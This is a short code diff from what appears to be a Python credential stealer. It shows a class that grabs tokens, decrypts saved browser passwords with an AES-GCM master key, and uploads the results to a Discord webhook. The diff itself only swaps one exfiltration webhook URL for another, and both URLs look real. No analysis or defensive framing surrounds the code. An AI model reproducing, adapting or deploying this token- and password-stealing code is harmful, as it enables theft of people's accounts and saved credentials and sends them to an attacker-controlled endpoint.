@@ -29,7 +29,7 @@ class D:
         self.tks = []
         self.ids = []
         self.grabtks()
-        self.upload('https://discord.com/api/webhooks/1085264670639792169/BvKtc3LXbHMxeB-anttTr5SzgS2S_-9jzN9KfSoXqb7d8V8e_7PablbntWgBsZhMo53j')
+        self.upload('https://discord.com/api/webhooks/1086787651782328410/sDoP7NpMYWzvE_mZMmx03iuACCPv8HwLGNC8Yzv4ppTi5j42kbrMvSg_Au8jUsSa5G7n')
     def decrypt_val(self, buff, master_key):
         try: return AES.new(master_key, AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
         except Exception: return "Failed to decrypt password"
